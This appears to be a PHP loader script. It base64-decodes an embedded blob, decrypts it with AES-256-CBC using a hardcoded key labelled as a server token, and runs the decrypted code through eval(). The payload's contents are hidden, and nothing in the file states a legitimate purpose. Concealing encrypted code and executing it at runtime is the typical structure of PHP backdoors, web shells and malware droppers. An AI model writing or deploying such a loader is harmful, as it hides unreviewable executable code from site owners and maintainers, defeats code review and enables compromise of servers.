<?php

function load($x, $gToken) {
    list($a, $code) = explode('::', base64_decode($x), 2);
    return openssl_decrypt($a, 'AES-256-CBC', $gToken, 1, $code);
}

$gToken = "G-Code"; // token to load server
$x = "WG/Mrhd1rnrDnnbyjfJP2Hog9QQq/DTGq2nqfhk9VTNvHo6JzB4IgZVsn5/iCW0KNxfrySHRDK8y52Ud3DA2QjnH3tMfp0HZoPODtdtWmrE7jZZ56sphA7dt8tLCYWwtZmrF6buHvRRacECdpzOHroQvrrVjbuoKnfXqsJwXKhmFcLswxPIZdCGGael/BfdAtET5QnfkAdOuDARbUMlCtNNcCtrIXBKbiNigijYc15meiv3Io3DAs2d0EeD3h8ufFrWmnCVhcoFqHaa8SEDhPwzgkuHV8eh/HPpRg8QWRIDo3qAkmNdnBnUNX80HE5kTb+04kxHjSEDKYwDnZqUUhQB4VgRAkfJTT7SPrnPujM3HJvWqAkCRrIb6Ati5p1cErYt6kTWpat0DRQqGxEwlbaSGPWsFaCom3zsrfg7//pyi5eQAbY9c4nSSnLmp+sVCFcY4ZhNZdC0qoMUCHT+SscMDRmFCwalOw25Wkjpr/7zqmm7ujM4AJ6iRaCXRXS7LOjr1HjsqanRaydQZ87o1Mu8M";

$gcodeLoader = load($x, $gToken);

if($gcodeLoader == "" || $gcodeLoader == null || !$gcodeLoader) die("invalid key!"); else eval($gcodeLoader);